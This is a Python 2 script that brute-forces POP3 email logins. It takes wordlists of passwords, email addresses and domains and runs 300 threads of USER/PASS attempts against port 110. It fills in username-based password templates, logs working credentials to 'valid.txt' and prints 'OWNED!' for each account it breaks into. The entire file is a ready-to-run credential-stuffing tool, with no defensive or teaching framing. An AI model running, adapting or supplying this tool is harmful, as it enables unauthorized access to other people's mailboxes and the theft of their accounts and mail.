#!/usr/bin/python
from __future__ import print_function
import os
import Queue
import threading
import socket
import urllib, urllib2, cookielib, time, sys, base64, struct, ssl
bad = open('bad.txt','a')
fileout = open("valid.txt" , "a")
 
########################################################################
class Downloader(threading.Thread):
 
    #----------------------------------------------------------------------
    def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue = queue
 
    #----------------------------------------------------------------------
    def run(self):
        while True:
			host,user,passwd = self.queue.get()
			self.checker(host,user,passwd)
			self.queue.task_done()

    #----------------------------------------------------------------------
    def checker(self,Host,sUser,Passwd):
		popU = "USER " + sUser + "\r\n"
		
		try:
			if '%user%' in str(Passwd):
				Passwd = Passwd.split("%")[0]+ sUser.split("@")[0] + Passwd.split("%")[2]
			if '%User%' in str(Passwd):
				pwd = sUser.split("@")[0] + Passwd.split("%")[2]
				Passwd = Passwd.split("%")[0]+pwd.title()
			if str(Passwd) == '%null%':
				Passwd = ''

			popP = "PASS " + Passwd + "\r\n"
			SS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			SS.setblocking(0)
			SS.settimeout(12)
			#SS = ssl.wrap_socket(S)
			
			try:
				SS.connect((Host,110))
			except socket.error as e:
				f = 1
			else:
				try:
					

					
					data1 = SS.recv(4096)
				except socket.error as e:
					f = 1
				else:
					if data1[:3] != "+OK":
						f = 1
						try:
							SS.close()
						except socket.error as e:
							f = 1
					else:
						try:
							SS.send(popU)
							data2 = SS.recv(4096)
						except socket.error as e:
							f = 1
							try:
								SS.close()
							except socket.error as e:
								f = 1
						else:
							if data2[:3] != "+OK":
								f = 1
								try:
									SS.close()
								except socket.error as e:
									f = 1
							else:
								try:
									SS.send(popP)
									data3 = SS.recv(4096)
								except socket.error as e:
									f = 1
									try:
										SS.close()
									except socket.error as e:
										f = 1
								else:
									if data3[:3] != "+OK":
										f = 1
										try:
											progress = '\r[+]Trying: ' + Host+" "+sUser + " " +popP.rstrip()+'                                        '
											sys.stdout.write(progress)
											sys.stdout.flush()
											bad.write(Host+" "+sUser+'\n')
											bad.flush()
											SS.close()
										except socket.error as e:
											f = 1
									else:
										fileout.write(Host + " " + sUser + " " + Passwd + '\n')
										fileout.flush()
										print("\rOWNED!    " + Host + ' ' + popU.rstrip() + ' ' + popP.rstrip() + '                                                       ')
										SS.close()
		except Exception as e:
			print(e)
			
def main(users,passwds,numthreads):
	
	queue = Queue.Queue(maxsize=8000)
	for i in range(numthreads):
		t = Downloader(queue)
		t.daemon = True
		t.start()
 
	#print('Incarcam Datele...')
	datas = []
	
	prefs = ['mail.']
	for pref in prefs:
		for passwd in passwds:
			for user in users:
				if pref == 'none':
					try:
						host = user.split("@")[1]
						queue.put((host.rstrip(),user.rstrip(),passwd.rstrip()))
					except:
						f = 1
				else:
					try:
						host =  pref+user.split("@")[1]
						queue.put((host.rstrip(),user.rstrip(),passwd.rstrip()))
					except:
						f = 1

	queue.join()
 
 
def main2(domains,users,passwds,numthreads):
	
	queue = Queue.Queue(maxsize=8000)
	for i in range(numthreads):
		t = Downloader(queue)
		t.daemon = True
		t.start()
 
	#print('Incarcam Datele...')
	datas = []
	prefx = [""]
	for pref in prefx:
		for password in passwds:
			for user in users:
				for dom in domains:
					dom2 = pref+dom
					user2 = user+"@"+dom
					queue.put((dom2, user2,password))

	queue.join()
if __name__ == "__main__":
#-----------------------------------------
	fispas = open("pwd.txt",'rU')
	fisusers = open("emails.txt",'rU')
	fisdom = open("domains.txt",'rU')

	numthreads = 300
#-----------------------------------------
	os.system('clear')

	passwds = fispas.read().splitlines()
	users = fisusers.read().splitlines()
	domains = fisdom.read().splitlines()
	main2(domains,users,passwds,numthreads)

